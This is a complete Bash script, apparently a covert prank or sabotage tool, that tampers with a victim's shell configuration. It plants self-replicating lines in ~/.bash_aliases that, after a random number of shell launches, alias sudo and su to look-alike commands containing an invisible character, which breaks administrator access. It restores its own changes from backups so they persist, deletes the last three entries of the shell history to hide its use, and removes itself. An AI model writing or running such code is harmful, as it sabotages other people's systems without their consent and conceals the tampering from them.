echo "####################################"
echo "Don't forget to clear your browsing history!"
echo "####################################"

# Name Of Folder with backups in home directory, change if needed (this folder needs to exist)
Backups="Dokumenty"

# Backup .bashrc
rm -f ~/$Backups/.bashrc
cp -b  ~/.bashrc ~/$Backups/.bashrc



# Start Counting
echo 'LOL=2 ' >> ~/.bash_aliases

# Clone script on every console execution
# For Fourth (Or Later) User sudo and su will stop working
echo "echo 'if [ \$LOL -gt \$((2+\$RANDOM%10)) ]' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'then' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'alias sudo=sud‎o' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'alias su=s‎u' >> ~/.bash_aliases" >> ~/.bash_aliases
# Absolute Domination
echo "echo 'rm -f ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'cp -b ~/$Backups/.bashrc ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'echo \"alias sudo=sud‎o\" >> ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'echo \"alias su=s‎u\" >> ~/.bashrc' >> ~/.bash_aliases" >> ~/.bash_aliases
# Reset Count
echo "echo 'rm -f ~/.bash_aliases' >> ~/.bash_aliases" >> ~/.bash_aliases
echo "echo 'cp -b ~/$Backups/.bash_aliases ~/.bash_aliases' >> ~/.bash_aliases" >> ~/.bash_aliases
# End If
echo "echo 'fi' >> ~/.bash_aliases" >> ~/.bash_aliases
# Increase Count
echo "echo 'LOL=\$((\$LOL+1))' >> ~/.bash_aliases" >> ~/.bash_aliases

#Backup Executor
rm -f ~/$Backups/.bash_aliases
cp -b  ~/.bash_aliases ~/$Backups/.bash_aliases

#Clear Last 3 Commands From Command History
(sed "$(( $(wc -l < ~/.bash_history)-3+1 )),$ d" ~/.bash_history ) >> ~/.bash_historyy
rm -f ~/.bash_history
cp ~/.bash_historyy ~/.bash_history
rm -f ~/.bash_historyy



#Auto Destruction
rm dominacja.sh

